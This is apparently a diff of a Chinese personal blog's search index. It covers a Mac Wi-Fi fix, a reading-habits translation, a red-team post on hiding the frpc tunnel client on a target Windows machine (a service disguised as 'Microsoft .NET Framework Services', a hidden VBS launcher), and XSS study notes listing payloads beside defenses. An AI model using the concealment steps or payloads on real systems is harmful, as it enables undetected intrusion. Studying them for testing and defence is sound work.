@@ -1,86 +1,194 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title><![CDATA[mac下任务栏卡死的解决办法]]></title>
-    <url>%2F2020%2F01%2Fmac-taskbar-crash%2F</url>
-    <content type="text"><![CDATA[mac下任务栏偶尔会卡死，表现为wifi无响应，鼠标变为忙碌状态，解决办法如下： 1sudo kill -9 `ps aux | grep -v grep | grep /usr/libexec/airportd | awk '&#123;print $2&#125;'`]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>mac下任务栏卡死的解决办法</title>
+      <link href="/2020/01/mac-taskbar-crash/"/>
+      <url>/2020/01/mac-taskbar-crash/</url>
+      
+        <content type="html"><![CDATA[<p>mac下任务栏偶尔会卡死，表现为wifi无响应，鼠标变为忙碌状态，解决办法如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">kill</span> -9 `ps aux | grep -v grep | grep /usr/libexec/airportd | awk <span class="string">'&#123;print $2&#125;'</span>`</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>杂项</category>
+          
+          <category> 杂项 </category>
+          
       </categories>
-      <tags>
-        <tag>Mac</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Win 平台下静默运行frpc客户端的两种办法]]></title>
-    <url>%2F2019%2F09%2Ffrp%2F</url>
-    <content type="text"><![CDATA[最近在用frp这款内网穿透工具，确实好用，但实际使用中有个小问题，windows平台下，frpc客户端默认打开后是有一个命令行窗口的，像下面这样。这…在真实演习环境中就太尴尬了，唯恐不被管理员发现吗…另外在webshell的非交互式shell中，如果直接执行frpc.exe -c frpc.ini 会出现webshell无响应的情况。有没有后台静默运行frp的方式呢，迈萌我经过一番寻找，总结方法2个。 方法1:使用winsw把frpc当作系统服务启动winsw全称为Windows Service Wrapper，它可以快速把一个可执行的程序注册为Windows的系统服务。使用时，首先要下载winsw，winsw下载地址：https://github.com/kohsuke/winsw/releases下载后有两个可执行文件，WinSW.NET2.exe和WinSW.NET4.exe，WinSW.NET2.exe一般运行在win7、win server2008的系统中，WinSW.NET4.exe一般运行在win10、win server 2012及以后的系统中，大家使用时注意不要选错了，这里我用的是WinSW.NET4.exe。 然后在WinSW.NET4.exe所在目录下新建一个配置文件WinSW.NET4.xml，为了增强迷惑性，迈萌我把名称全部命名为系统服务相关名称，哈哈，内容如下：12345678&lt;service&gt; &lt;id&gt;mnfs&lt;/id&gt; &lt;name&gt;Microsoft .NET Framework Services&lt;/name&gt; &lt;description&gt;Microsoft .NET Framework Services&lt;/description&gt; &lt;executable&gt;frpc&lt;/executable&gt; &lt;arguments&gt;-c frpc.ini&lt;/arguments&gt; &lt;logmode&gt;reset&lt;/logmode&gt;&lt;/service&gt; 然后以管理员权限执行命令：WinSW.NET4.exe install //注册服务WinSW.NET4.exe start //启动服务成功注册并启动服务，如下图： 再看看我们的frps服务端，已经成功接收到连接请求了。 我们再看看目标机器的任务管理器，会发现已经找不到frpc了，是不是隐蔽多了呢。我们再到系统服务中看看是什么样子，发现frp服务已经运行，名字叫Microsoft .NET Framework Services，哈哈，如下：这里winsw路径没改，实战中可以放到windows目录中去，再给winsw改个名，就更隐蔽了。 如果要停止运行，执行：WinSW.NET4.exe stop删除服务，执行：WinSW.NET4.exe uninstall 方法2:使用wscript以脚本方式启动frp**wscript全称“Windows Scripting Host”，是一种批次语言/自动执行工具，可以拿来执行.wsh，.vbs，.js等。这里我们新建一个vbs脚本，脚本内容如下： 12set ws=WScript.CreateObject("WScript.Shell") ws.Run "frpc.exe -c frpc.ini",0 直接在命令行执行 wscript 1.vbs即可，启动后的效果如下： 命令行没有任何回显，打开任务管理器，我们能看到frpc已经成功启动了，如下： 这个方法比较简便，但任务管理器中能看到frpc进程，隐蔽性一般，还是推荐方法1。 本文首发bithack.io。]]></content>
+      
+      
+        <tags>
+            
+            <tag> Mac </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Win 平台下静默运行frpc客户端的两种办法</title>
+      <link href="/2019/09/frp/"/>
+      <url>/2019/09/frp/</url>
+      
+        <content type="html"><![CDATA[<p>最近在用frp这款内网穿透工具，确实好用，但实际使用中有个小问题，windows平台下，frpc客户端默认打开后是有一个命令行窗口的，像下面这样。<br><img src="/2019/09/frp/1.jpg" alt="1.jpg"><br>这…在真实演习环境中就太尴尬了，唯恐不被管理员发现吗…另外在webshell的非交互式shell中，如果直接执行frpc.exe -c frpc.ini 会出现webshell无响应的情况。有没有后台静默运行frp的方式呢，<a href="https://maimeng.me" title="迈萌安全">迈萌</a>我经过一番寻找，总结方法2个。</p><h2 id="方法1-使用winsw把frpc当作系统服务启动"><a href="#方法1-使用winsw把frpc当作系统服务启动" class="headerlink" title="方法1:使用winsw把frpc当作系统服务启动"></a>方法1:使用winsw把frpc当作系统服务启动</h2><p>winsw全称为Windows Service Wrapper，它可以快速把一个可执行的程序注册为Windows的系统服务。使用时，首先要下载winsw，winsw下载地址：<a href="https://github.com/kohsuke/winsw/releases" target="_blank" rel="noopener">https://github.com/kohsuke/winsw/releases</a><br>下载后有两个可执行文件，WinSW.NET2.exe和WinSW.NET4.exe，WinSW.NET2.exe一般运行在win7、win server2008的系统中，WinSW.NET4.exe一般运行在win10、win server 2012及以后的系统中，大家使用时注意不要选错了，这里我用的是WinSW.NET4.exe。</p><p>然后在WinSW.NET4.exe所在目录下新建一个配置文件WinSW.NET4.xml，为了增强迷惑性，<a href="https://maimeng.me" title="迈萌安全">迈萌</a>我把名称全部命名为系统服务相关名称，哈哈，内容如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>mnfs<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Microsoft .NET Framework Services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Microsoft .NET Framework Services<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">executable</span>&gt;</span>frpc<span class="tag">&lt;/<span class="name">executable</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">arguments</span>&gt;</span>-c frpc.ini<span class="tag">&lt;/<span class="name">arguments</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logmode</span>&gt;</span>reset<span class="tag">&lt;/<span class="name">logmode</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后以管理员权限执行命令：<br>WinSW.NET4.exe install //注册服务<br>WinSW.NET4.exe start //启动服务<br>成功注册并启动服务，如下图：<br><img src="/2019/09/frp/4.jpg" alt="4.jpg"></p><p>再看看我们的frps服务端，已经成功接收到连接请求了。<br><img src="/2019/09/frp/5.jpg" alt="5.jpg"></p><p>我们再看看目标机器的任务管理器，会发现已经找不到frpc了，是不是隐蔽多了呢。我们再到系统服务中看看是什么样子，发现frp服务已经运行，名字叫Microsoft .NET Framework Services，哈哈，如下：<br><img src="/2019/09/frp/6.jpg" alt="6.jpg"><br>这里winsw路径没改，实战中可以放到windows目录中去，再给winsw改个名，就更隐蔽了。</p><p>如果要停止运行，执行：<br><code>WinSW.NET4.exe stop</code><br>删除服务，执行：<br><code>WinSW.NET4.exe uninstall</code></p><h2 id="方法2-使用wscript以脚本方式启动frp"><a href="#方法2-使用wscript以脚本方式启动frp" class="headerlink" title="方法2:使用wscript以脚本方式启动frp**"></a>方法2:使用wscript以脚本方式启动frp**</h2><p>wscript全称“Windows Scripting Host”，是一种批次语言/自动执行工具，可以拿来执行.wsh，.vbs，.js等。这里我们新建一个vbs脚本，脚本内容如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> <span class="attribute">ws</span>=WScript.CreateObject("WScript.Shell") </span><br><span class="line">ws.<span class="builtin-name">Run</span> <span class="string">"frpc.exe -c frpc.ini"</span>,0</span><br></pre></td></tr></table></figure><p>直接在命令行执行 wscript 1.vbs即可，启动后的效果如下：</p><p><img src="/2019/09/frp/2.jpg" alt="2.jpg"></p><p>命令行没有任何回显，打开任务管理器，我们能看到frpc已经成功启动了，如下：</p><p><img src="/2019/09/frp/3.jpg" alt="3.jpg"><br>这个方法比较简便，但任务管理器中能看到frpc进程，隐蔽性一般，还是推荐方法1。</p><p>本文首发<a href="https://bithack.io/forum/585" target="_blank" rel="noopener">bithack.io</a>。</p>]]></content>
+      
+      
       <categories>
-        <category>web安全</category>
+          
+          <category> web安全 </category>
+          
       </categories>
-      <tags>
-        <tag>红队</tag>
-        <tag>frp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[一年阅读200本书背后的简单真相【翻译】]]></title>
-    <url>%2F2019%2F05%2Fread-200-books%2F</url>
-    <content type="text"><![CDATA[最近爱上了看Medium平台的文章，文章质量相当高，抽出零碎时间，翻译自己感兴趣的文章。《一年阅读200本书背后的简单真相》翻译如下： 有人曾经问过沃伦巴菲特成功的秘密，巴菲特指着一堆书说道： “每天像这样阅读500页书，这就是知识运作的方式。它像复利一样逐步积累。你们都可以做到，但我保证你们中的很多人都做不到…” 当我两年前第一次发现巴菲特的这句名言时，出了些问题。 那是2014年的12月，我找到了我梦寐以求的工作。有一天，我会待在我工作的地方，我会去想：”我的天啊，如果我40年后还在这里会怎么办，我不想像这样死去…” 有些事是不对的。我按照传统路线一路走来：好成绩，领导，推荐，学院，理想职业。我是一个胜利者。我完成了比赛。现在我正在实现梦想的过程中。但有些事情很糟糕，非常的糟糕。 2015年1月，我发现了巴菲特的这句名言。我决定像这样阅读。我决定这样读啊读永不停止，知道我得到一些可恶的结论。 我没有达到每天阅读500页图书的水平，但是在最近两年我已经阅读了400多本书。开始阅读的决定是我生命中最重要的决定之一。 书给了我旅行的勇气。书给了我辞去工作的勇气。在虚拟的世界里，书给了我榜样、英雄和相关意义。 我想说每年阅读200本书是一件令人吃惊的事，但事实是，每个人都能做到。 1. 不要在开始前就放弃了当小乔听到“每天阅读500页图书”的建议时，他当时的反应一定是，”没门，这不可能”。 小乔会继续拼凑补充他的理由，来辩解他的观点是对的，却没有做任何深度思考。这些理由可能包括”我太忙了”，”我不够聪明”，”这些书不适合我”等等。 但是如果我们更深入思考一些呢？例如，每年阅读200本书到底要付出多大代价？两年前我在开始这项工程前，我停下来做了计算，我发现每年阅读200本书一点也不难。 就像巴菲特说的，任何人都可以做到，但多数人不愿意去做。 2. 做一道简单的数学题一年阅读200本书需要花多长时间？ 首先，我们来看两个统计数字： 美国人平均每分钟读200～400个单词 通常一本非小说类的图书大约有50000个单词 现在，我们来做一个快速的计算： 200 本书 * 50000 个单词 = 1000万单词1000万单词 / 400 单词每分钟 = 25000分钟25000分钟 / 60 = 417 小时 这就是所有需要做的。阅读200本书，每年需要417小时。 我知道，如果你的想法和我一样，你很可能看到”417小时”后立即放弃，很多人一周只工作40小时，我们怎么可能一年阅读417小时？！ 3. 挖掘时间417小时，看上去似乎很多，但是，真的这样吗？我们尝试获取更多的观点。 我们看看美国人平均一年花在社交媒体和电视上的时间： 社交媒体花费705小时电视上花费2737.5小时 我靠，每年竟然在这些垃圾时间上花了3442.5小时，如果这些时间都用来读书的话，你一年将能读1600本书！ 这就是阅读大量书籍背后的简单事实：并不是这么难。我们拥有所有我们需要的时间，最可怕的部分-我们所忽略的-是我们太容易上瘾，太虚弱，太容易分心，不能做我们都知道的重要的事。 如果我们想阅读更多图书，只需要拿出一些在twitter上粉名人的时间、观看”绝望主妇”电视剧的时间等等，转换为阅读时间即可， 道理很简单，但执行很困难。 4. 执行我们都知道阅读很重要，我们都知道我们要为它付出，然而，很多人并没有这么做。为什么会这样？主要原因是：无法坚持执行。 这方面我并不是非常擅长，但我有一些技巧来帮我坚持执行。 4.1 打造阅读环境如果你要戒掉可卡因，你会把它放在你的房间周围吗？肯定不会，媒介被设计为容易上瘾的了。远离易上瘾的媒介和解毒一样难。 ÷移走所有容易让你分心的东西 把书放在你旁边，想看的时候不用翻箱倒柜的找 举个例子，看看我的环境： 图1 图2 我经常旅行，但这并不妨碍我阅读。图1是我在泰国时的书架，我把书放在我旁边，这样我想阅读时随手就可以拿起一本开始阅读。 图2是我智能手机的桌面，桌面上只有2个app，一个是kindle app，用来阅读的。另一个是haibitica app，用于帮助我习惯养成和目标达成的工具。 4.2 养成好习惯靠意志力并不是改变生活方式的好办法，它总是在你最需要它的时候不争气。养成好习惯，构建习惯的堡垒，才能让你在艰难的时候保持弹性。 如果你对如何养成习惯不熟悉，我推荐一本书：Superhuman by Habit，它非常实用，实用是我最关心的。 我用了好几年才养成好习惯。我犯的许多错误都是可以避免的，如果可以重来的话，我会找一个习惯养成教练。这里作者推荐了一个网站coach，教练会帮助你养成好习惯，最终阅读更多的书。 4.3 多种方式阅读决定阅读后，就不要对阅读方式要求过高，要像插头一样即插即用。 如果你想读更多书，就不要太挑剔阅读地点和阅读方式，我阅读纸质书、电子书、听书，我在任何我能阅读的地方看书：公园的长凳、公交车、卫生间等等。 “有一天我读了一本书，我的整个生活都随之改变了。” - Orhan Pamuk 如果我没有开始读书，也许我还在做以前的工作，也许我还在办公桌前看着闹钟想我就这么一直下去直到老去。 如果你也有类似的情况，试试读书吧，你很可能会找到比你想要的更多的东西。 原文链接：The Simple Truth Behind Reading 200 Books a Year，by Charles Chu 生词：compound，prescription，damn，conviction，snap，scary，Addicted，cocaine，fortress，resilient，infinite，jack，picky]]></content>
+      
+      
+        <tags>
+            
+            <tag> 红队 </tag>
+            
+            <tag> frp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>一年阅读200本书背后的简单真相【翻译】</title>
+      <link href="/2019/05/read-200-books/"/>
+      <url>/2019/05/read-200-books/</url>
+      
+        <content type="html"><![CDATA[<p>最近爱上了看Medium平台的文章，文章质量相当高，抽出零碎时间，翻译自己感兴趣的文章。《一年阅读200本书背后的简单真相》翻译如下：</p><p>有人曾经问过沃伦巴菲特成功的秘密，巴菲特指着一堆书说道：</p><blockquote><p>“每天像这样阅读500页书，这就是知识运作的方式。它像复利一样逐步积累。你们都可以做到，但我保证你们中的很多人都做不到…”</p></blockquote><p>当我两年前第一次发现巴菲特的这句名言时，出了些问题。</p><p>那是2014年的12月，我找到了我梦寐以求的工作。有一天，我会待在我工作的地方，我会去想：”我的天啊，如果我40年后还在这里会怎么办，我不想像这样死去…”</p><p>有些事是不对的。我按照传统路线一路走来：好成绩，领导，推荐，学院，理想职业。我是一个胜利者。我完成了比赛。现在我正在实现梦想的过程中。但有些事情很糟糕，非常的糟糕。</p><p>2015年1月，我发现了巴菲特的这句名言。我决定像这样阅读。我决定这样读啊读永不停止，知道我得到一些可恶的结论。</p><p>我没有达到每天阅读500页图书的水平，但是在最近两年我已经阅读了400多本书。开始阅读的决定是我生命中最重要的决定之一。</p><p>书给了我旅行的勇气。书给了我辞去工作的勇气。在虚拟的世界里，书给了我榜样、英雄和相关意义。</p><p>我想说每年阅读200本书是一件令人吃惊的事，但事实是，每个人都能做到。</p><h1 id="1-不要在开始前就放弃了"><a href="#1-不要在开始前就放弃了" class="headerlink" title="1. 不要在开始前就放弃了"></a>1. 不要在开始前就放弃了</h1><p>当小乔听到“每天阅读500页图书”的建议时，他当时的反应一定是，”没门，这不可能”。</p><p>小乔会继续拼凑补充他的理由，来辩解他的观点是对的，却没有做任何深度思考。这些理由可能包括”我太忙了”，”我不够聪明”，”这些书不适合我”等等。</p><p>但是如果我们更深入思考一些呢？例如，每年阅读200本书到底要付出多大代价？两年前我在开始这项工程前，我停下来做了计算，我发现每年阅读200本书一点也不难。</p><p>就像巴菲特说的，任何人都可以做到，但多数人不愿意去做。</p><h1 id="2-做一道简单的数学题"><a href="#2-做一道简单的数学题" class="headerlink" title="2. 做一道简单的数学题"></a>2. 做一道简单的数学题</h1><p>一年阅读200本书需要花多长时间？</p><p>首先，我们来看两个统计数字：</p><ul><li><p>美国人平均每分钟读200～400个单词</p></li><li><p>通常一本非小说类的图书大约有50000个单词</p></li></ul><p>现在，我们来做一个快速的计算：</p><blockquote><p>200 本书 * 50000 个单词 = 1000万单词<br>1000万单词 / 400 单词每分钟 = 25000分钟<br>25000分钟 / 60 = 417 小时</p></blockquote><p>这就是所有需要做的。阅读200本书，每年需要417小时。</p><p>我知道，如果你的想法和我一样，你很可能看到”417小时”后立即放弃，很多人一周只工作40小时，我们怎么可能一年阅读417小时？！</p><h1 id="3-挖掘时间"><a href="#3-挖掘时间" class="headerlink" title="3. 挖掘时间"></a>3. 挖掘时间</h1><p>417小时，看上去似乎很多，但是，真的这样吗？我们尝试获取更多的观点。</p><p>我们看看美国人平均一年花在社交媒体和电视上的时间：</p><blockquote><p>社交媒体花费705小时<br>电视上花费2737.5小时</p></blockquote><p>我靠，每年竟然在这些垃圾时间上花了3442.5小时，如果这些时间都用来读书的话，你一年将能读1600本书！</p><p>这就是阅读大量书籍背后的简单事实：并不是这么难。我们拥有所有我们需要的时间，最可怕的部分-我们所忽略的-是我们太容易上瘾，太虚弱，太容易分心，不能做我们都知道的重要的事。</p><p>如果我们想阅读更多图书，只需要拿出一些在twitter上粉名人的时间、观看”绝望主妇”电视剧的时间等等，转换为阅读时间即可，</p><p>道理很简单，但执行很困难。</p><h1 id="4-执行"><a href="#4-执行" class="headerlink" title="4. 执行"></a>4. 执行</h1><p>我们都知道阅读很重要，我们都知道我们要为它付出，然而，很多人并没有这么做。为什么会这样？主要原因是：无法坚持执行。</p><p>这方面我并不是非常擅长，但我有一些技巧来帮我坚持执行。</p><h2 id="4-1-打造阅读环境"><a href="#4-1-打造阅读环境" class="headerlink" title="4.1 打造阅读环境"></a>4.1 打造阅读环境</h2><p>如果你要戒掉可卡因，你会把它放在你的房间周围吗？肯定不会，媒介被设计为容易上瘾的了。远离易上瘾的媒介和解毒一样难。</p><ul><li>÷移走所有容易让你分心的东西</li><li>把书放在你旁边，想看的时候不用翻箱倒柜的找</li></ul><p>举个例子，看看我的环境：<br><img src="/2019/05/read-200-books/1.jpg" alt></p><center>图1</center><p><img src="/2019/05/read-200-books/2.jpg" alt></p><center>图2</center><p>我经常旅行，但这并不妨碍我阅读。图1是我在泰国时的书架，我把书放在我旁边，这样我想阅读时随手就可以拿起一本开始阅读。</p><p>图2是我智能手机的桌面，桌面上只有2个app，一个是kindle app，用来阅读的。另一个是haibitica app，用于帮助我习惯养成和目标达成的工具。</p><h2 id="4-2-养成好习惯"><a href="#4-2-养成好习惯" class="headerlink" title="4.2 养成好习惯"></a>4.2 养成好习惯</h2><p>靠意志力并不是改变生活方式的好办法，它总是在你最需要它的时候不争气。养成好习惯，构建习惯的堡垒，才能让你在艰难的时候保持弹性。</p><p>如果你对如何养成习惯不熟悉，我推荐一本书：<a href="http://amzn.to/2jiYwDl?source=post_elevate_sequence_page---------------------------" target="_blank" rel="noopener">Superhuman by Habit</a>，它非常实用，实用是我最关心的。</p><p>我用了好几年才养成好习惯。我犯的许多错误都是可以避免的，如果可以重来的话，我会找一个习惯养成教练。这里作者推荐了一个网站<a href="www.coach.me">coach</a>，教练会帮助你养成好习惯，最终阅读更多的书。</p><h2 id="4-3-多种方式阅读"><a href="#4-3-多种方式阅读" class="headerlink" title="4.3 多种方式阅读"></a>4.3 多种方式阅读</h2><p>决定阅读后，就不要对阅读方式要求过高，要像插头一样即插即用。</p><p>如果你想读更多书，就不要太挑剔阅读地点和阅读方式，我阅读纸质书、电子书、听书，我在任何我能阅读的地方看书：公园的长凳、公交车、卫生间等等。</p><blockquote><p>“有一天我读了一本书，我的整个生活都随之改变了。”  - Orhan Pamuk</p></blockquote><p>如果我没有开始读书，也许我还在做以前的工作，也许我还在办公桌前看着闹钟想我就这么一直下去直到老去。</p><p>如果你也有类似的情况，试试读书吧，你很可能会找到比你想要的更多的东西。</p><p>原文链接：<a href="https://medium.com/s/story/the-simple-truth-behind-reading-200-books-a-year-1767cb03af20" target="_blank" rel="noopener">The Simple Truth Behind Reading 200 Books a Year</a>，by Charles Chu</p><p>生词：compound，prescription，damn，conviction，snap，scary，Addicted，cocaine，fortress，resilient，infinite，jack，picky</p>]]></content>
+      
+      
       <categories>
-        <category>杂项</category>
+          
+          <category> 杂项 </category>
+          
       </categories>
-      <tags>
-        <tag>阅读</tag>
-        <tag>自律</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[《那些年我们一起学XSS》读书笔记]]></title>
-    <url>%2F2019%2F04%2Fxss-naxienian%2F</url>
-    <content type="text"><![CDATA[最近在看《那些年我们一起学XSS》，由于每篇文章涉及的关键技巧并不多，在阅读时就想着把关键技巧记录下，以便下次高效查阅。感谢心伤的瘦子，无偿奉献这么好的东西，向你致敬，不知胖了没有。 第一课：什么都没过滤的情况输出点123&lt;HTML 标签&gt;&lt;/HTML 标签&gt;[输出]&lt;HTML 标签&gt;&lt;/HTML 标签&gt; 关键点啥都没过滤，直接x就行： 直接构造&lt;script&gt;evalcode&lt;/script&gt; 构造带监听事件的html标签，例如&lt;img src=1 onerror=evalcode &gt; 防御过滤&lt;&gt;。 第二课：输出在&lt;script&gt;&lt;/script&gt;里面的情况输出点 123&lt;script&gt;[输出]&lt;/script&gt; 关键点 没过滤&lt;&gt;/的话，构造输出xx&lt;/script&gt;&lt;script&gt;eval code&lt;/script&gt;闭合script标签即可。 过滤了&lt;&gt;/的话，直接插入恶意代码，保证代码两头语法正确，不报错即可。例如eval(&#39;alert()&#39;);void(xx)。void含义需理解。void（xx）：执行一个表达式，而不返回值。 防御过滤&lt;&gt;/；定制化过滤。 第三课：输出在html属性里的情况输出点 123&lt;input value="输出"&gt;&lt;img onload="...[输出]..."&gt;&lt;body style="...[输出]..."&gt; 关键点 对于style属性，可尝试css表达式执行js，IE6、7可以。关键代码：expression: eval(xx)。小技巧：css 里，允许使用转义字符\ + ascii16 进制形式。 其他html属性，可利用实体编码特性，对关键字进行实体编码，再进行url编码，实现饶过。例如： 1234&lt;img src="1" onerror="alert()"&gt;和&lt;img src="1" onerror="&amp;#x61;lert()"&gt;是等效的 然后代码转换为 url 编码。 &amp; -&gt; %26, # -&gt; %23 防御过滤\&amp;#;。 第四课：宽字节复仇记输出点1//请求参数的值传给了js里的某个变量，但对值里的双引号"做了过滤，导致无法闭合双引号 关键点页面编码为GB系的前提下，使用%c0闭合双引号。怎样看页面编码：看meta标签 &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb18030&quot; /&gt;GBK编码第一字节（高字节）的范围是0x81～0xFE。GB2312是被GBK兼容的，它的高位范围是0xA1～0xF7。 迈萌我举个例子： 12345678//请求参数：gb.php?x=1";alert(1)////直接发送，"被转义：a="1\";alert(1)//";//调整参数：gb.php?x=1%81";alert(1)////最终结果，成功闭合双引号：a="1[%81和\拼接成的新字符]";alert(1)//"; 防御1、赋值前用js检查数据内容，只允许使用字母数字下划线等，其他字符一律过滤；2、用utf-8编码 第五课：反斜线复仇记输出点 输出点还是在js代码里，不同的是，这一课需要同时利用多个技巧。 关键点 反斜线\可以吃掉原代码里的双引号”， //可以注释掉右边的代码 ==的运算优先级比&amp;高 如何避免变量未定义，可控的后边主动声明一个，例如： from==1，from没定义会报错，代码后面加上function from(){}即可。函数声明会被优先解析。 空格被过滤的话，可以用/**/代替。例如： function/**/aa(){} 防御过滤 第六课：换行符复仇记输出点 12345&lt;script&gt;代码段//xx[输出点]xx代码段&lt;/script&gt; 关键点 构造输出点：%0Aalert();//即可，利用换行符开启新的一行。例如： 原请求：a=1，我们构造：a=%0Aalert();//，最终输出如下：123456&lt;script&gt;代码段//xxalert();//xx代码段&lt;/script&gt; alert()触发执行。 防御尽量不要在js注释里输出内容，太危险。 第七课：宽字节、反斜线与换行符一起复仇记输出点 123456//双引号已过滤&lt;input value="[输出点]" &gt;&lt;script&gt;//a="[输出点]";var b="[输出点]";&lt;/script&gt; 关键点 1、换行符可以分割注释。2、js里字符串的值运行多行书写，用\分割。3、\被过滤，要试试能不能用宽字节饶过。 防御参考前面的修复办法。 第八课：Dom XSS入门 [显式输出]输出点 1234567//双引号已过滤&lt;div id="div1"&gt;aaa&lt;/div&gt; &lt;script&gt; var a="[输出点]"; document.getElementById("div1").innerHTML=a; &lt;/script&gt;&lt;/script&gt; 关键点 1、js字符串用unicode字符表示：例如&lt;用\u003c，&gt;用\u003e表示，空格用\u0020表示。2、js字符串用十六进制字符表示：例如&lt;用\x3c，&gt;用\x3e表示。防御参考前面的修复办法。 第九课：Dom XSS入门 [隐式输出]输出点 123456//请求：?name=xx&lt;div id="div1"&gt;&lt;/div&gt; &lt;script&gt; var a=getParam("name"); document.getElementById("div1").innerHTML=a; &lt;/script&gt; 关键点 1、请求参数做了赋值，在js里搜索请求参数即可。 2、decodeURICompent() 防御过滤。 第十课：Dom XSS进阶 [邂逅eval]输出点 1234//请求：?name=xx&lt;script&gt; eval(getParam('name'));&lt;/script&gt; 关键点 1、可控参数传入了eval函数； 2、小技巧：在可控参数加入\等特殊字符，看js是否报错，快速定位到相关代码； 请求：http://kf.qq.com/search_app.shtml?key;alert(1);//=aaaa12eval('this.key="aaaa";');eval('this.key;alert(1);//="aaaa";'); 成功触发alert执行。 防御过滤。 第十一课：DOM XSS进阶[善变iframe]输出点 1&lt;iframe src="xxx"&gt;&lt;/iframe&gt; 关键点iframe的src属性：123456//javascript:&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;//vbscript:&lt;iframe src="vbscript:msgbox(1)"&gt;&lt;/iframe&gt;//data协议：&lt;iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt; Chrome iframe的srcdoc属性（IE不支持）：1&lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt; 举例： 获取url里的参数，赋值到iframe的src属性，赋值前只过滤了javascript关键字，这种情况可以用data、vbscript饶过，最终触发xss。防御src属性里，除了过滤jasvascipt关键字，还要过滤vbscript、data等关键字。]]></content>
+      
+      
+        <tags>
+            
+            <tag> 阅读 </tag>
+            
+            <tag> 自律 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《那些年我们一起学XSS》读书笔记</title>
+      <link href="/2019/04/xss-naxienian/"/>
+      <url>/2019/04/xss-naxienian/</url>
+      
+        <content type="html"><![CDATA[<p>最近在看《那些年我们一起学XSS》，由于每篇文章涉及的关键技巧并不多，在阅读时就想着把关键技巧记录下，以便下次高效查阅。感谢心伤的瘦子，无偿奉献这么好的东西，向你致敬，不知胖了没有。</p><h1 id="第一课：什么都没过滤的情况"><a href="#第一课：什么都没过滤的情况" class="headerlink" title="第一课：什么都没过滤的情况"></a>第一课：什么都没过滤的情况</h1><p><strong>输出点</strong><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span> 标签&gt;</span><span class="tag">&lt;/<span class="name">HTML</span> 标签&gt;</span></span><br><span class="line">[输出]</span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span> 标签&gt;</span><span class="tag">&lt;/<span class="name">HTML</span> 标签&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>关键点</strong><br>啥都没过滤，直接x就行：</p><ol><li>直接构造<code>&lt;script&gt;evalcode&lt;/script&gt;</code></li><li>构造带监听事件的html标签，例如<code>&lt;img src=1 onerror=evalcode &gt;</code></li></ol><p><strong>防御</strong><br>过滤<code>&lt;&gt;</code>。</p><h1 id="第二课：输出在-lt-script-gt-lt-script-gt-里面的情况"><a href="#第二课：输出在-lt-script-gt-lt-script-gt-里面的情况" class="headerlink" title="第二课：输出在&lt;script&gt;&lt;/script&gt;里面的情况"></a>第二课：输出在<code>&lt;script&gt;&lt;/script&gt;</code>里面的情况</h1><p><strong>输出点</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">[输出]</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>关键点</strong></p><ol><li>没过滤<code>&lt;&gt;/</code>的话，构造输出<code>xx&lt;/script&gt;&lt;script&gt;eval code&lt;/script&gt;</code>闭合script标签即可。</li><li>过滤了<code>&lt;&gt;/</code>的话，直接插入恶意代码，保证代码两头语法正确，不报错即可。例如<code>eval(&#39;alert()&#39;);void(xx)</code>。void含义需理解。void（xx）：执行一个表达式，而不返回值。</li></ol><p><strong>防御</strong><br>过滤<code>&lt;&gt;/</code>；定制化过滤。</p><h1 id="第三课：输出在html属性里的情况"><a href="#第三课：输出在html属性里的情况" class="headerlink" title="第三课：输出在html属性里的情况"></a>第三课：输出在html属性里的情况</h1><p><strong>输出点</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 